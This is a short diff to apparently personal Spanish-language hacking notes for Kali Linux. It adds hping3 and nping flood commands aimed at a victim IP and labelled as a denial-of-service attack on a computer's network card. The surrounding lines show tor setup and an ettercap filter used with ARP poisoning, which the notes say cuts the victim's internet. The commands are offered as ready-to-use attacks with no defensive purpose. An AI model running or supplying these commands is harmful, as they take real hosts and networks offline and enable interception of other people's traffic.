@@ -5,6 +5,12 @@
 
 nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
 
+ATAQUE DOS A TARGETA DE RED DE UN COMPUTADOR, 
+hping3 -c 50000 -i u100 <ip_victima>
+nping --icmp -c 50000 --rate 20000 <ip_victima>
+
+
+ATAQUE DOS A UN SERVICIO WEB
 apt-get install tor
 service tor start
 service tor status
@@ -92,3 +98,29 @@ kill();
 msg("Dos attack \n");}     //Se crea un bloc de notas con este codigo y se le pone nombre "dos.elt"
 etterfilter dos.elt -o dos.ef  //esto se hace donde esta guardado el documento
 ettercap -i wlan0 -T -q -F dos.ef -M ARP ////  //se explota la vulnerabilidad y la victima no tendra mas internet.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
